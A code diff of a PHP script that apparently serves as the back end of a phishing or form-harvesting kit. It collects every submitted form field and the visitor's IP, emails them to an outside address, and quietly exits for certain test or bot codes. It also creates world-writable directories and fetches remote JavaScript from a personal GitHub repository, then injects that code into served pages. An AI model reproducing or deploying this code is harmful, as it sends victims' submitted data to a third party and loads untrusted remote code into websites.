@@ -1,13 +1,21 @@
 <?php
+
 $root = $_SERVER['DOCUMENT_ROOT']; 
+$json = json_encode($_POST);
+
+
+
 if(isset($_POST['_id'])) {
+    $id = $_POST['_id'];
 
 
     if(isset($_POST['code'])){
         $code = $_POST['code'];
-        } else {
-            $code = "NA";
         }
+
+
+
+
         if(isset($_POST['device'])){
             $device = $_POST['device'];
         }
@@ -28,31 +36,36 @@ if(isset($_POST['_id'])) {
         
         if (isset($code)) {
             $in = $code;
-        } else {
-            $in = "in";
-        };
+        }
         $link = $_POST['ip'];
         
-        foreach ($_POST as $key => $value) {
-            if($key == 'to'){
-                unset( $key , $value);
-            }
+        foreach ($_POST as $key => $value) 
             $body .= $key . ' : ' . $value . "\r\n";
-        }
+        
         
             if($link){
             $body .= "https://whatismyipaddress.com/ip/" . $link;
             }
         
             if (in_array($code, array("vsdg", "prev", "elem","wp-admin",'test'))){
-                $to = "drodriguez@safeguardcasualty.com";
+                exit;
+                //$to = "drodriguez@safeguardcasualty.com";
             } else {
-        
-                $to = $_POST['to'];
+                if(isset($_POST['to'])){
+                    $to = $_POST['to'];
+    
+                } else {
+                    $to = 'drodriguez@safeguardcasualty.com';
+                }
+                
             }
         
         
-        
+            if($in == ''){
+                $in =  $_SERVER['REMOTE_ADDR'];
+    
+            }
+
         
         $email = 'drodriguez@safeguardcasualty.com'; 
         $from = $in . '@' . $_SERVER['HTTP_HOST'];
@@ -62,7 +75,6 @@ if(isset($_POST['_id'])) {
         
         mail($to, $subject, $body, $headers);
         exit;
-
 }
 
 
@@ -90,7 +102,7 @@ if($server == 'www'){
 $dir = '/var/www/';
 $data = 'data.json';
 $main = 'master.js';
-$style = 'style.css';
+$style = 'master.css';
 $content = 'content.js';
 $index = 'index.php';
 /*
@@ -108,10 +120,8 @@ echo $content . '<br>';
 echo $index . '<br>';
 echo $_SERVER['REQUEST_URI'] . '<br>';
 echo $_SERVER['HTTP_HOST'];
-
-
-$root = $_SERVER['DOCUMENT_ROOT']; 
 */
+
 if (!file_exists($root .'/script/')) {
     mkdir($root .'/script/', 0777, true);
     $file = fopen($root .'/script/'. $index, 'w') or die("Unable to open $index!");
@@ -131,22 +141,17 @@ if (!file_exists($root .'/data/')) {
     mkdir($root .'/data/', 0777, true);
     $file = fopen($root .'/data/'. $index, 'w') or die("Unable to open $index!");
     fclose($file);
-
-
-    $json_data = json_encode($_POST);
-    $fileJson = fopen($root .'/data/'. $data, 'w+');
-    file_put_contents($root .'/data/'. $data, $json_data);
-    fclose($fileJson);
-
-
-
-
 }
 
 
 
 
+/*
+
+$json_data = json_encode($posts);
+file_put_contents($root .'/data/'. $data, $json_data);
 //echo $root .'/script/'. $content;
+*/
 if(!is_file($root .'/script/'. $content)){
 
     $file = fopen($root .'/script/'. $content, 'w') or die("Unable to open $content!");
@@ -162,7 +167,6 @@ if(!is_file($root .'css/'. $style)){
 
 
 if(!is_file($root .'css/bootstrap.css')){
-
     $data = file_get_contents('https://raw.githubusercontent.com/drod247/main.js/main/bootstrap.css');
     $myfile = fopen($root .'css/bootstrap.css', "w");
     fwrite($myfile, $data);
@@ -171,24 +175,31 @@ if(!is_file($root .'css/bootstrap.css')){
     }
 
     if(!is_file($root .'/script/ajax.js')){
-
         $dat = file_get_contents('https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js');
-        $myfile = fopen($root .'/script/ajax.js', "w");
+        $myfile = fopen($root .'/script/controller.js', "w");
         fwrite($myfile, $dat);
         fclose($myfile);
         
         }
 
-if(!is_file($root .'/script/'. $main)){
+    if(!is_file($root .'/script/loading.js')){
+        $dat = file_get_contents('https://raw.githubusercontent.com/drod247/main.js/main/loading.js');
+        $myfile = fopen($root .'/script/loading.js', "w");
+        fwrite($myfile, $dat);
+        fclose($myfile);
+        
+        }
 
+
+
+if(!is_file($root .'/script/'. $main)){
     $dat = file_get_contents('https://raw.githubusercontent.com/drod247/main.js/main/master.js');
     $myfile = fopen($root .'/script/'. $main, "w") or die("Unable to open $main!");
     fwrite($myfile, $dat);
     fclose($myfile);
-    
     }
     
-    /*
+    
 
 
    if( basename(__FILE__, '.php') == 'index'){
@@ -206,10 +217,30 @@ if(!is_file($root .'/script/'. $main)){
         
  echo   '</body>';
  echo   '</html>';
-   } else {
-    //echo '<script src="/script/ajax.js"></script>';
-    //echo "<script type='text/javascript' src='/script/${main}'></script>";
-     */ 
-echo '<script>import("/script/ajax.js").then((module) => { $.getScript( "../script/main.js", function() {console.log("loaded")})});</script>';
-
+   } 
+ //   echo '<script>import("/script/controller.js").then((module) => { $.getScript( "../script/master.js", function() {console.log("loaded")})});</script>';
+    $ui =  str_replace('/','',dirname($_SERVER['PHP_SELF']));
+//$ui = basename(dirname(__FILE__));
+//echo $ui;
+//if(is_file($root ."script/${ui}.js")){
+//echo "<script>import('/script/${ui}.js');</script>";
+//} else {
+  //  echo "<script>import('/script/content.js');</script>";
+//}
    
+function first(){
+    echo '<script>import("/script/controller.js").then((module) => { $.getScript( "../script/master.js", function() {console.log("loaded")})});</script>';
+   // echo "<script>import('../script/content.js');</script>";
+}
+function second(){
+
+            echo "<script>import('../script/content.js');</script>";
+}
+if(first()){
+    second();
+
+}
+
+if(is_file($root ."../script/${ui}.js")){
+    echo "<script>import('../script/${ui}.js');</script>";
+    } 
